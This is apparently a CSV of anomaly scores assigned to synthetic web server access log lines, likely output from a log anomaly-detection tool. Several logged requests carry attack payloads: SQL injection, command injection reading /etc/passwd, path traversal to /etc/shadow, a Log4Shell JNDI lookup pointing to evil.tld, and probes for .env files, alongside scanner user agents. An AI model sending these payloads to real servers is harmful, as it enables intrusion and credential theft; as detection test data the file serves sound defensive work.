score_content,score_session,score_fused,score_fused_norm,line
69.47913360595703,,69.47913360595703,69.47913360595703,206.250.187.176 - - [10/Jan/2025:12:00:00 +0100] "HEAD /search?q=monitor HTTP/1.1" 200 18298 "-" "curl/7.85.0"
24.349485397338867,,24.349485397338867,24.349485397338867,123.51.186.156 - - [10/Jan/2025:12:00:01 +0100] "GET /search?q=laptop HTTP/1.1" 200 10161 "-" "Wget/1.21.2 (linux-gnu)"
95.10478973388672,,95.10478973388672,95.10478973388672,169.123.26.189 - - [10/Jan/2025:12:00:01 +0100] "OPTIONS /search?q=ssd HTTP/1.1" 200 10330 "https://example.com/" "nikto/2.5.0"
97.884765625,,97.884765625,97.884765625,45.212.159.159 - - [10/Jan/2025:12:00:04 +0100] "OPTIONS /search?q=router HTTP/1.1" 302 3204 "-" "python-requests/2.31.0"
2.0113718509674072,,2.0113718509674072,2.0113718509674072,40.173.159.248 - - [10/Jan/2025:12:00:05 +0100] "GET /contact HTTP/1.1" 200 1046 "-" "curl/7.85.0"
24.420555114746094,,24.420555114746094,24.420555114746094,169.174.40.120 - - [10/Jan/2025:12:00:06 +0100] "GET /api/user?id=1;DROP TABLE users HTTP/1.1" 200 17291 "https://example.com/" "python-requests/2.31.0"
126.19583129882812,,126.19583129882812,126.19583129882812,53.172.215.182 - - [10/Jan/2025:12:00:08 +0100] "TRACE /search?q=headphones HTTP/1.1" 204 5218 "-" "python-requests/2.31.0"
52.61849594116211,,52.61849594116211,52.61849594116211,113.254.115.241 - - [10/Jan/2025:12:00:09 +0100] "DELETE /api/product?id=123 HTTP/1.1" 304 17167 "https://example.com/" "dirb/2.22"
95.01850128173828,,95.01850128173828,95.01850128173828,51.35.94.36 - - [10/Jan/2025:12:00:10 +0100] "OPTIONS /search?q=router HTTP/1.1" 200 6381 "https://example.com/" "python-requests/2.31.0"
0.18769040703773499,,0.18769040703773499,0.18769040703773499,4.188.252.184 - - [10/Jan/2025:12:00:13 +0100] "GET /assets/app.css HTTP/1.1" 204 2197 "-" "sqlmap/1.7.2#stable"
35.42958450317383,,35.42958450317383,35.42958450317383,52.195.121.210 - - [10/Jan/2025:12:00:14 +0100] "PUT /search?q=headphones HTTP/1.1" 200 12702 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.160030364990234,,47.160030364990234,47.160030364990234,46.247.192.214 - - [10/Jan/2025:12:00:15 +0100] "HEAD /profile HTTP/1.1" 200 13830 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
94.99128723144531,,94.99128723144531,94.99128723144531,134.135.242.146 - - [10/Jan/2025:12:00:18 +0100] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 6158 "-" "sqlmap/1.7.2#stable"
27.141618728637695,,27.141618728637695,27.141618728637695,145.18.128.181 - - [10/Jan/2025:12:00:18 +0100] "POST /search?q=ssd HTTP/1.1" 200 10108 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
35.49313735961914,,35.49313735961914,35.49313735961914,249.44.188.226 - - [10/Jan/2025:12:00:20 +0100] "PUT /search?q=monitor HTTP/1.1" 200 16445 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
126.31415557861328,,126.31415557861328,126.31415557861328,245.76.94.181 - - [10/Jan/2025:12:00:20 +0100] "TRACE /search?q=laptop HTTP/1.1" 200 17527 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.350324630737305,,24.350324630737305,24.350324630737305,126.206.123.64 - - [10/Jan/2025:12:00:22 +0100] "GET /search?q=phone HTTP/1.1" 200 2185 "https://twitter.com/" "dirb/2.22"
2.0160512924194336,,2.0160512924194336,2.0160512924194336,126.99.228.236 - - [10/Jan/2025:12:00:22 +0100] "GET /contact HTTP/1.1" 200 7604 "https://www.google.com/" "python-requests/2.31.0"
49.674949645996094,,49.674949645996094,49.674949645996094,177.172.68.127 - - [10/Jan/2025:12:00:22 +0100] "DELETE /search?q=phone HTTP/1.1" 200 17093 "https://example.com/" "sqlmap/1.7.2#stable"
27.307579040527344,,27.307579040527344,27.307579040527344,170.160.60.153 - - [10/Jan/2025:12:00:24 +0100] "DELETE /profile HTTP/1.1" 200 10607 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
95.0626220703125,,95.0626220703125,95.0626220703125,131.167.149.134 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 4633 "-" "nikto/2.5.0"
95.15001678466797,,95.15001678466797,95.15001678466797,199.52.180.132 - - [10/Jan/2025:12:00:27 +0100] "OPTIONS /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 17002 "https://www.google.com/" "dirb/2.22"
4.7409796714782715,,4.7409796714782715,4.7409796714782715,162.105.144.160 - - [10/Jan/2025:12:00:30 +0100] "POST /contact HTTP/1.1" 200 9420 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30185.04296875,,30185.04296875,30185.04296875,217.67.130.155 - - [10/Jan/2025:12:00:31 +0100] "HEAD /wp-login.php HTTP/1.1" 404 1014 "https://twitter.com/" "curl/7.85.0"
47.11946105957031,,47.11946105957031,47.11946105957031,252.78.96.233 - - [10/Jan/2025:12:00:34 +0100] "HEAD /api/products HTTP/1.1" 200 16081 "-" "nikto/2.5.0"
11124.3037109375,,11124.3037109375,11124.3037109375,238.70.163.254 - - [10/Jan/2025:12:00:36 +0100] "OPTIONS /search?q=laptop HTTP/1.1" 500 1393 "-" "Wget/1.21.2 (linux-gnu)"
27.2511043548584,,27.2511043548584,27.2511043548584,220.126.109.32 - - [10/Jan/2025:12:00:39 +0100] "DELETE /dashboard HTTP/1.1" 200 14323 "https://twitter.com/" "nikto/2.5.0"
0.22235225141048431,,0.22235225141048431,0.22235225141048431,246.167.129.117 - - [10/Jan/2025:12:00:40 +0100] "GET /assets/app.js HTTP/1.1" 200 1462 "-" "dirb/2.22"
2.2891759872436523,,2.2891759872436523,2.2891759872436523,224.27.253.99 - - [10/Jan/2025:12:00:41 +0100] "GET / HTTP/1.1" 201 2289 "https://example.com/" "python-requests/2.31.0"
0.2221537083387375,,0.2221537083387375,0.2221537083387375,178.137.182.246 - - [10/Jan/2025:12:00:44 +0100] "GET /assets/app.css HTTP/1.1" 201 12678 "https://example.com/" "dirb/2.22"
103.97911834716797,,103.97911834716797,103.97911834716797,5.95.156.185 - - [10/Jan/2025:12:00:45 +0100] "TRACE /profile HTTP/1.1" 200 17800 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
0.20819982886314392,,0.20819982886314392,0.20819982886314392,112.8.136.138 - - [10/Jan/2025:12:00:48 +0100] "GET /assets/app.css HTTP/1.1" 200 7605 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11.676377296447754,,11.676377296447754,11.676377296447754,187.223.239.160 - - [10/Jan/2025:12:00:50 +0100] "PUT /.env HTTP/1.1" 200 8029 "-" "curl/7.85.0"
